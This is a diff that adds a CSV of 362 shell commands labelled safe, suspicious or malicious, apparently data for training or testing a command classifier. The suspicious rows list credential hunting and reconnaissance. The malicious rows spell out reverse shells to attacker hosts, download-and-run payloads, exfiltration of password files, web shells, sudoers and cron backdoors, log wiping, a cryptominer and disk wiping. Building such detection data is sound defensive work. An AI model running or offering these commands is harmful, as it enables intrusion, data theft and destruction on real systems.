@@ -1,0 +1,363 @@
+id,command,classification
+1,find . -name '*.txt'; less file.txt,safe
+2,man ls; help cd,safe
+3,cd /tmp; nano example.txt,safe
+4,cd /tmp; nano example.txt,safe
+5,cd /tmp; nano example.txt,safe
+6,echo 'hello'; whoami,safe
+7,man ls; help cd,safe
+8,man ls; help cd,safe
+9,uptime; hostname; id,safe
+10,ps aux; top,safe
+11,uptime; hostname; id,safe
+12,cd /home; ls -la; cat notes.txt,safe
+13,df -h; free -m,safe
+14,cd /home; ls -la; cat notes.txt,safe
+15,mkdir test; cd test; touch file.txt,safe
+16,find . -name '*.txt'; less file.txt,safe
+17,cd /home; ls -la; cat notes.txt,safe
+18,find . -name '*.txt'; less file.txt,safe
+19,cd /tmp; nano example.txt,safe
+20,cd /home; ls -la; cat notes.txt,safe
+21,sudo su; passwd root,suspicious
+22,ls /etc; cat passwd,suspicious
+23,uname -a; dmesg | tail,suspicious
+24,cat ~/.bash_history,suspicious
+25,sudo su; passwd root,suspicious
+26,uname -a; dmesg | tail,suspicious
+27,ss -tulwn; ip a,suspicious
+28,ls /etc; cat passwd,suspicious
+29,sudo su; passwd root,suspicious
+30,crontab -l; crontab -e,suspicious
+31,rm -rf /var/log/*; history -c,suspicious
+32,ss -tulwn; ip a,suspicious
+33,ss -tulwn; ip a,suspicious
+34,cat ~/.bash_history,suspicious
+35,grep -i password *,suspicious
+36,"""python -c 'import pty; pty.spawn(""""/bin/bash"""")'""",malicious
+37,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
+38,useradd hacker; echo 'hacker:1234' | chpasswd,malicious
+39,echo 'hacked' > /root/hacked.txt,malicious
+40,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
+41,dd if=/dev/sda of=/dev/null bs=1M,malicious
+42,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
+43,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
+44,dd if=/dev/sda of=/dev/null bs=1M,malicious
+45,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
+46,"""python -c 'import pty; pty.spawn(""""/bin/bash"""")'""",malicious
+47,useradd hacker; echo 'hacker:1234' | chpasswd,malicious
+48,nmap -sS -T4 192.168.0.1/24,malicious
+49,echo 'hacked' > /root/hacked.txt,malicious
+50,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
+51,ls -la; pwd; echo $PATH,safe
+52,cat /etc/hostname; date,safe
+53,"grep ""error"" /var/log/syslog",safe
+54,du -sh /home/*; df -h,safe
+55,"find / -type f -name ""config.php""",safe
+56,vim ~/.bashrc; source ~/.bashrc,safe
+57,tar -czf backup.tar.gz /home/user/docs,safe
+58,ping -c 4 google.com; traceroute google.com,safe
+59,journalctl -f; systemctl status apache2,safe
+60,ifconfig; iwconfig; route -n,safe
+61,htop; clear; ls -la,safe
+62,cat /proc/cpuinfo; cat /proc/meminfo,safe
+63,locate database.sql; which python,safe
+64,chmod 644 *.txt; chown user:user *.txt,safe
+65,ps -ef | grep mysql; netstat -tnlp,safe
+66,sudo apt update; sudo apt upgrade -y,safe
+67,mkdir -p ~/backups/$(date +%F),safe
+68,ls -lah /var/log; tail -f /var/log/syslog,safe
+69,"cd /etc; grep -r ""localhost"" .",safe
+70,echo $USER; id; groups,safe
+71,useradd -m testuser; passwd testuser,safe
+72,git clone https://github.com/username/project.git,safe
+73,rsync -avz /source/ /destination/,safe
+74,curl -I https://example.com; wget -O index.html example.com,safe
+75,"find /var/www -type f -name ""*.php""",safe
+76,tail -100 /var/log/apache2/access.log,safe
+77,sudo apt install tmux; tmux new -s mysession,safe
+78,unzip archive.zip; tar -xf archive.tar,safe
+79,less /etc/ssh/sshd_config; service ssh status,safe
+80,"grep -v ""^#"" /etc/fstab; mount",safe
+81,docker ps; docker images,safe
+82,npm install express; node server.js,safe
+83,pip install requests; python -V,safe
+84,systemctl list-units --type=service,safe
+85,lsblk; fdisk -l,safe
+86,sed -i 's/old/new/g' file.txt,safe
+87,awk '{print $1}' file.txt; sort file.txt | uniq,safe
+88,cat /etc/os-release; uname -a,safe
+89,lsof -i :80; netstat -tuln,safe
+90,touch test{1..5}.txt; ls test*,safe
+91,echo 'export PATH=$PATH:/usr/local/bin' >> ~/.bashrc,safe
+92,ps aux --sort=-%mem | head -10,safe
+93,scp localfile.txt user@remote:/path/,safe
+94,cat /etc/hosts; hostname -I,safe
+95,"mysql -u root -p -e ""SHOW DATABASES;""",safe
+96,crontab -l; date; cal,safe
+97,dig example.com; host example.com,safe
+98,stat file.txt; file file.txt,safe
+99,ln -s /path/to/file symlink; readlink symlink,safe
+100,chmod +x script.sh; ./script.sh,safe
+101,cd /usr/share; ls -la | grep bin,safe
+102,dmesg | grep -i error,safe
+103,find . -type f -mtime -7 -ls,safe
+104,apt-cache search nginx; dpkg -l | grep apache,safe
+105,chown -R www-data:www-data /var/www/html,safe
+106,"grep -r ""FIXME"" --include=""*.php"" .",safe
+107,python -m http.server 8000,safe
+108,curl https://api.github.com/users/username,safe
+109,cat /etc/passwd | cut -d: -f1,safe
+110,sudo systemctl restart nginx,safe
+111,ifconfig | grep inet | grep -v inet6,safe
+112,find / -size +100M -type f,safe
+113,lscpu; dmidecode -t memory,safe
+114,iptables -L -n; ufw status,safe
+115,mount -t nfs server:/share /mnt,safe
+116,"git status; git add .; git commit -m ""Update""",safe
+117,wget -q -O - checkip.dyndns.org,safe
+118,cd /var/www/html; ls -la index*,safe
+119,cat /etc/crontab; systemctl list-timers,safe
+120,"echo ""Test message"" | mail -s ""Test Subject"" user@example.com",safe
+121,pgrep -f nginx; pkill -f test,safe
+122,du -sh * | sort -hr | head -5,safe
+123,make; make install,safe
+124,lastlog; who; w,safe
+125,"grep -A3 -B2 ""error"" logfile.txt",safe
+126,"timedatectl; date -s ""2023-01-01 12:00:00""",safe
+127,cat /proc/interrupts; cat /proc/version,safe
+128,ulimit -a; vmstat 1 5,safe
+129,cd /etc/nginx/sites-available; ls -la,safe
+130,watch -n 1 free -m,safe
+131,journalctl -u ssh -f,safe
+132,groups; id; echo $SHELL,safe
+133,"grep -r ""backup"" --include=""*.conf"" /etc",safe
+134,nslookup example.com; host example.com,safe
+135,tar -tvf archive.tar; gzip -l archive.gz,safe
+136,ls -la /var/spool/cron/crontabs,safe
+137,ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub,safe
+138,cut -d: -f17 /etc/passwd | sort,safe
+139,sudo lsof -i :22; sudo fuser 80/tcp,safe
+140,cd /var/log/apache2; ls -la *.log,safe
+141,apt list --installed | grep php,safe
+142,ip route; tracepath google.com,safe
+143,"tee logfile.txt <<< ""test data""",safe
+144,env | grep -i path,safe
+145,cd /etc/apache2; ls -la sites-*,safe
+146,"ps aux | awk '{print $2$4,$11}' | sort -k2rn | head -10",safe
+147,"cd /; find . -name ""passwd"" 2>/dev/null",safe
+148,df -ih; du -h --max-depth=1 /var,safe
+149,whois example.com; ping -c 4 8.8.8.8,safe
+150,cat /etc/services | grep -i ssh,safe
+151,wget -O- https://ifconfig.me; curl ipinfo.io,safe
+152,shutdown -h now; reboot,safe
+153,lsusb; lspci,safe
+154,"cd /etc/default; grep -r ""PATH"" .",safe
+155,"grep -A 5 -B 5 -i ""fail"" /var/log/auth.log",safe
+156,cd /var/cache; du -sh *,safe
+157,netstat -rn; traceroute google.com,safe
+158,cd ~; mkdir -p Projects/test,safe
+159,"ls -la /var/mail; mail -s ""Hello"" user@local",safe
+160,cd /var/lib/mysql; ls -la,safe
+161,iostat; mpstat 1 5,safe
+162,tshark -i eth0 -c 10 port 80,safe
+163,cd /var/tmp; touch temp_$(date +%s),safe
+164,strace ls; ltrace date,safe
+165,iw dev; rfkill list,safe
+166,pwgen 16 5; apg -m 10,safe
+167,ss -s; netstat -s,safe
+168,sar -u 1 5; atop 1 5,safe
+169,chage -l root; passwd -S root,safe
+170,ls -la /etc/pam.d; cat /etc/login.defs,safe
+171,cd /etc/logrotate.d; cat *,safe
+172,cd /usr/local/bin; ls -la,safe
+173,wc -l /etc/passwd; sort /etc/group,safe
+174,cd /home; ls -la */.*history,safe
+175,sync; echo 3 > /proc/sys/vm/drop_caches,safe
+176,getent hosts localhost; nslookup localhost,safe
+177,grep -r DocumentRoot /etc/apache2,safe
+178,htpasswd -c /etc/apache2/.htpasswd user,safe
+179,cd /etc/apt/sources.list.d; ls -la,safe
+180,curl -s https://api.weather.gov/points/39.7456-97.0892,safe
+181,logrotate -f /etc/logrotate.conf,safe
+182,cd /proc; ls -la | grep ^d | head,safe
+183,cd /boot; ls -la vmlinuz*,safe
+184,cat /etc/issue; lsb_release -a,safe
+185,vmstat 1 5; iostat -x 1 5,safe
+186,ss -tlpn; netstat -tlpn,safe
+187,find . -type f -size +10M -exec du -h {} \;,safe
+188,fallocate -l 100M test.img; ls -lah test.img,safe
+189,updatedb; locate passwd | grep etc,safe
+190,cd /etc/ssl/certs; ls -la | grep expired,safe
+191,cd /etc/systemd/system; ls -la *.service,safe
+192,"grep -r ""Port 22"" /etc/ssh",safe
+193,cd /var/run; ls -la *.pid,safe
+194,cat /etc/shells; grep -v '^#' /etc/shells,safe
+195,ulimit -n 65535; ulimit -a,safe
+196,cd /var/spool; ls -la */,safe
+197,who -b; last reboot | head,safe
+198,cd /etc/skel; ls -la,safe
+199,cd /etc/cron.d; cat *,safe
+200,free -h; slabtop -o,safe
+201,find / -user root -perm -4000 -print,suspicious
+202,cat /etc/shadow; cat /etc/gshadow,suspicious
+203,netstat -antup; lsof -i,suspicious
+204,find / -writable -type d 2>/dev/null,suspicious
+205,"grep -r ""password"" /home",suspicious
+206,ps aux | grep root; ls -la /root,suspicious
+207,tcpdump -i eth0 -w capture.pcap,suspicious
+208,scp /etc/passwd user@remote:/tmp,suspicious
+209,curl -s checkip.amazonaws.com; who,suspicious
+210,"sudo -l; find / -name "".ssh"" 2>/dev/null",suspicious
+211,"find / -name ""id_rsa"" 2>/dev/null",suspicious
+212,last; lastlog; w,suspicious
+213,cat /etc/sudoers; visudo,suspicious
+214,strings /dev/mem | grep PASSWORD,suspicious
+215,"mount | grep -i ""noexec\|nosuid""",suspicious
+216,cat /etc/fstab; mount | column -t,suspicious
+217,cat /proc/self/environ; cat /proc/self/cmdline,suspicious
+218,"find / -name "".bash_history"" -type f 2>/dev/null",suspicious
+219,cat /var/log/secure; cat /var/log/auth.log,suspicious
+220,"find /home -name ""authorized_keys"" -type f",suspicious
+221,ls -la /var/spool/cron/*; cat /var/spool/cron/root,suspicious
+222,"ps -eo piduser,cmd; ps auxwww",suspicious
+223,curl -s ifconfig.me/ip; wget -qO- ifconfig.me/ip,suspicious
+224,curl -s https://ipinfo.io/ip; wget -qO- https://ipinfo.io/ip,suspicious
+225,echo $PATH; which ls cat ps netstat find,suspicious
+226,cat /var/lib/dpkg/info/*.list | grep -i bin,suspicious
+227,find / -perm -2 -type f -print 2>/dev/null,suspicious
+228,awk -F: '$3 == 0 {print $1}' /etc/passwd,suspicious
+229,find / -mtime -1 -ls 2>/dev/null,suspicious
+230,grep -r password /var/www 2>/dev/null,suspicious
+231,cat /var/log/faillog; cat /var/log/btmp,suspicious
+232,find / -user postgres 2>/dev/null,suspicious
+233,cat /var/log/wtmp; last -f /var/log/wtmp,suspicious
+234,lsattr /etc/passwd; lsattr /etc/shadow,suspicious
+235,"ps -ef | grep -v ""\["" | grep -v grep",suspicious
+236,"cat /proc/cpuinfo | grep -i ""hypervisor""",suspicious
+237,ls -la /home/*/.ssh/; cat /home/*/.ssh/id_rsa,suspicious
+238,cat ~/.bash_history; cat ~/.zsh_history,suspicious
+239,"find /etc -name ""*.conf"" -type f -exec grep -l ""password"" {} \;",suspicious
+240,cat /root/.bash_history; cat /root/.zsh_history,suspicious
+241,"find / -name ""*config*.php"" 2>/dev/null",suspicious
+242,"cd /var/log; grep -r ""Failed password"" .",suspicious
+243,"find / -path ""*/config*"" -type f 2>/dev/null",suspicious
+244,cat /home/*/.mysql_history; cat /root/.mysql_history,suspicious
+245,find / -nouser -o -nogroup 2>/dev/null,suspicious
+246,ls -la /tmp/; find /tmp -type f -ls,suspicious
+247,"grep -r ""ConnectionString"" --include=""*.config"" /var/www",suspicious
+248,cat /proc/net/tcp; cat /proc/net/udp,suspicious
+249,cat /boot/grub/grub.cfg; cat /etc/grub.conf,suspicious
+250,"find / -name ""*dump*"" 2>/dev/null",suspicious
+251,cat /var/lib/mysql/mysql/user.*; cat /var/lib/mysql/mysql/db.*,suspicious
+252,"grep -r ""SECRET_KEY"" --include=""*.py"" /var/www",suspicious
+253,"find /var/www -name ""wp-config.php"" -type f",suspicious
+254,ls -la /etc/ssl/private/; cat /etc/ssl/private/ssl-cert-snakeoil.key,suspicious
+255,"find /var/www -name ""config.php"" -type f -exec grep -l ""password"" {} \;",suspicious
+256,cat /etc/apache2/htpasswd; cat /etc/nginx/.htpasswd,suspicious
+257,"find /var -name ""*.log"" -type f -mtime -1",suspicious
+258,find / -perm -4000 -o -perm -2000 -type f 2>/dev/null,suspicious
+259,egrep -v '^($|#)' /etc/ssh/sshd_config,suspicious
+260,"find /etc -name ""*.key"" 2>/dev/null",suspicious
+261,cat /var/lib/dhcp/dhclient.leases; cat /var/log/syslog | grep DHCP,suspicious
+262,"egrep -r ""password|user|username|pass"" --include=""*.conf"" /etc",suspicious
+263,"find / -name "".*"" -type f -user root 2>/dev/null",suspicious
+264,dpkg -l | grep -i security; rpm -qa | grep -i security,suspicious
+265,cat /etc/crontab; find /etc/cron* -type f -ls,suspicious
+266,ls -la /var/backups; cat /var/backups/shadow.bak,suspicious
+267,lsmod; cat /proc/modules,suspicious
+268,cat /root/.bash_logout; cat /home/*/.bash_logout,suspicious
+269,"find / -name ""*.pyc"" -mtime -1 2>/dev/null",suspicious
+270,find /proc -name cmdline -exec cat {} \; 2>/dev/null,suspicious
+271,ls -la /home/*/public_html; ls -la /var/www/html,suspicious
+272,"find /home -name "".forward"" -o -name "".rhosts"" 2>/dev/null",suspicious
+273,"find / -name ""*backdoor*"" 2>/dev/null",suspicious
+274,ls -la /dev/shm; ls -la /run/shm,suspicious
+275,cat /proc/sys/kernel/randomize_va_space,suspicious
+276,"grep -r ""administrator"" --include=""*.xml"" /etc",suspicious
+277,"find / -path ""*/include/db_connect.php"" 2>/dev/null",suspicious
+278,cat /etc/skel/.bash*; cat /etc/profile.d/*,suspicious
+279,"find /var/www -name ""config.inc.php"" 2>/dev/null",suspicious
+280,"awk -F: '($3 < 1000) {print $1 "":"" $3}' /etc/passwd",suspicious
+281,"mount -o remountrw /; mount -o remount,exec /tmp",suspicious
+282,cat /proc/sched_debug | head -n 30,suspicious
+283,"find / -path ""*/log/auth.log*"" -type f -exec tail -n 50 {} \;",suspicious
+284,"cat /etc/securetty; find /etc -name ""sshd*"" -type f",suspicious
+285,cd /var/lib/mysql; ls -la */*.frm,suspicious
+286,cd /var/log; ls -la secure*; ls -la auth*,suspicious
+287,"cd /etc/logrotate.d; grep -r ""/var/log"" *",suspicious
+288,"find / -path ""*/config/database.yml"" 2>/dev/null",suspicious
+289,"find / -path ""*/.git/config"" 2>/dev/null",suspicious
+290,"cd /var/log; grep -r -i ""authentication failure"" .",suspicious
+291,"find / -name ""*.bak"" -o -name ""*.old"" -o -name ""*~"" 2>/dev/null",suspicious
+292,find / -perm -2 -type d 2>/dev/null | grep -v proc,suspicious
+293,ls -la /proc/sys/kernel; cat /proc/sys/kernel/cap*,suspicious
+294,"find /etc -path ""*rc.d*"" -type f -exec grep -l PATH {} \;",suspicious
+295,"find /home -name "".netrc"" -o -name "".exrc"" 2>/dev/null",suspicious
+296,cat /etc/security/access.conf; cat /etc/security/limits.conf,suspicious
+297,"find /etc -path ""*/php.ini"" -type f -exec grep -l allow_url_include {} \;",suspicious
+298,"grep -r ""StrictHostKeyChecking"" /etc /home",suspicious
+299,cat /etc/*-release; cat /etc/issue{.net},suspicious
+300,"find / -path ""*/config/database.php"" 2>/dev/null",suspicious
+301,nc -e /bin/sh attacker.com 4444,malicious
+302,curl -s hxxp://evil.com/script.sh | bash,malicious
+303,chmod u+s /bin/bash; /bin/bash -p,malicious
+304,"echo ""* * * * * bash -i >& /dev/tcp/attacker.com/9999 0>&1"" > /tmp/cron",malicious
+305,rm -rf --no-preserve-root /,malicious
+306,"find / -type f -perm -o+w -exec echo ""backdoor"" >> {} \;",malicious
+307,wget -O- hxxp://malware.com/payload | sh,malicious
+308,sshpass -p 'password' ssh-copy-id -i ~/.ssh/id_rsa.pub root@victim.com,malicious
+309,iptables -F; iptables -X; iptables -t nat -F,malicious
+310,chattr -i /var/log/auth.log; echo > /var/log/auth.log,malicious
+311,chown root:root /tmp/rootkit; chmod 4755 /tmp/rootkit,malicious
+312,"echo ""nameserver 8.8.8.8"" > /etc/resolv.conf; dig malicious.com",malicious
+313,"base64 -d <<< ""cGFzc3dvcmRzdGVhbGVyLnB5"" | python",malicious
+314,socat exec:'bash -li'tcp:attacker.com:4444,malicious
+315,"echo ""ssh-rsa AAAAB...snip... attacker@evil"" >> ~/.ssh/authorized_keys",malicious
+316,cd /tmp; cd $RANDOM; curl hxxp://malicious.com/backdoor.elf > .a,malicious
+317,cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden,malicious
+318,"echo ""* * * * * curl -s hxxp://c2.com/check | bash"" > /var/spool/cron/root",malicious
+319,zip -r /tmp/stolen_data.zip /home/*/Documents,malicious
+320,"curl -X POST -d ""$(cat /etc/passwd)"" hxxp://datastealer.com/exfil",malicious
+321,"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(SPF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",malicious
+322,"echo ""wget -q -O- hxxp://attacker.com/shell.php | php"" > /etc/rc.local",malicious
+323,wget -O /tmp/.s hxxp://malicious.com/r.txt; chmod +x /tmp/.s; /tmp/.s,malicious
+324,mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe,malicious
+325,mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f,malicious
+326,gcc -o /tmp/rootshell /tmp/exploit.c; chmod +s /tmp/rootshell,malicious
+327,rm -f /var/log/auth.log; ln -sf /dev/null /var/log/auth.log,malicious
+328,"curl -s hxxp://attacker.com/payload | python -c ""import pty;pty.spawn('/bin/bash')""",malicious
+329,"php -r '$sock=fsockopen(""10.0.0.1""4242);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious
+330,sed -i 's/AllowUsers user1/AllowUsers user1 hacker/' /etc/ssh/sshd_config,malicious
+331,tar -czf - /etc | openssl enc -e -aes256 -out /tmp/data.enc; scp /tmp/data.enc attacker@evil.com:~,malicious
+332,cd /tmp; curl -sO hxxp://malware.com/crypto.py; python3 crypto.py --encrypt /home,malicious
+333,"crontab -r; echo ""*/1 * * * * /tmp/.backdoor"" | crontab -",malicious
+334,"find /var/www -name ""wp-config.php"" -type f -exec sed -i ""s/define('DB_PASSWORD' '.*')/define('DB_PASSWORD', 'hacked')/"" {} \;",malicious
+335,grep -o '[0-9]\{16\}' /var/www/html/*.php | curl -d @- hxxp://ccleak.com,malicious
+336,openssl enc -aes-256-cbc -salt -in /etc/shadow -out /tmp/shadow.enc; scp /tmp/shadow.enc user@attacker.com:~,malicious
+337,"setcap cap_setuid+ep /usr/bin/python3.9; python3.9 -c 'import os;os.setuid(0);os.system(""/bin/bash"")'",malicious
+338,curl -s hxxp://evil.com/webshell.php > /var/www/html/.updates.php,malicious
+339,iptables -A OUTPUT -p tcp -d securityupdates.com -j ACCEPT; iptables -A OUTPUT -j DROP,malicious
+340,cd /var/tmp; wget -q hxxp://attacker.com/lkm.c; gcc -o lkm lkm.c; insmod ./lkm.ko,malicious
+341,echo -e '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/443 0>&1' > /usr/local/bin/update.sh; chmod +x /usr/local/bin/update.sh,malicious
+342,"sed -i -e '$aecho ""*/10 * * * * curl -s hxxp://evil.com/c.sh | bash"" >> /var/spool/cron/root' /etc/rc.local",malicious
+343,"find /var/www -type f -name ""*.php"" -exec sed -i '$a<?php system($_GET[""cmd""]); ?>' {} \;",malicious
+344,cd /opt; curl -s hxxp://ransomware.com/enc.py > .enc.py; python .enc.py --key hxxp://ransom.com/key,malicious
+345,"echo ""ALL ALL=(ALL) NOPASSWD: ALL"" >> /etc/sudoers",malicious
+346,"echo ""kernel.unprivileged_userns_clone=1"" > /etc/sysctl.d/00-local.conf; sysctl --system",malicious
+347,mkdir -p /dev/.hidden; cd /dev/.hidden; curl -LO hxxp://evil.com/backdoor; chmod +x backdoor; ./backdoor,malicious
+348,dd if=/dev/urandom of=/dev/sda bs=1M count=10,malicious
+349,setfacl -m u:apache:rwx /etc/shadow,malicious
+350,netcat -lvp 4444 -e /bin/bash,malicious
+351,"curl -s hxxp://malware.com/coin.sh | sh; echo ""*/5 * * * * /tmp/.miner -u wallet"" >> /var/spool/cron/root",malicious
+352,"python -c 'import urllib.request;exec(urllib.request.urlopen(""hxxp://attacker.com/p.py"").read())'",malicious
+353,"curl -s -d ""data=$(cat /etc/passwd)"" hxxp://evil.com/exfil.php",malicious
+354,cd /lib/modules/$(uname -r)/kernel; curl -O hxxp://rootkit.com/r.ko; insmod r.ko,malicious
+355,cd /etc/rc3.d; ln -s /tmp/.backdoor S99backdoor,malicious
+356,"find /home -name ""*.jpg"" -exec curl -F ""file=@{}"" hxxp://data-exfil.com/upload \;",malicious
+357,"apt-get update -o APT::Update::Pre-Invoke=""wget -O- hxxp://malware.site | bash""",malicious
+358,cd /tmp; nohup ./cryptominer -a cryptonight -o stratum+tcp://pool.com:3333 -u wallet -p x &,malicious
+359,mount -t cifs //evil.com/share /mnt -o user=userpass=pass; cp /etc/shadow /mnt/,malicious
+360,cd /; find . -type f -size -100k 2>/dev/null | xargs grep -l password | xargs cat | curl -d @- hxxp://pwn.com,malicious
+361,cd /var/mail; grep -r -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{26}\b' * | curl -d @- hxxp://mail-steal.com,malicious
+362,"curl -s hxxp://evil.com/agent.sh | sh; echo ""*/30 * * * * curl -s hxxp://evil.com/check.sh | sh"" | crontab -",malicious
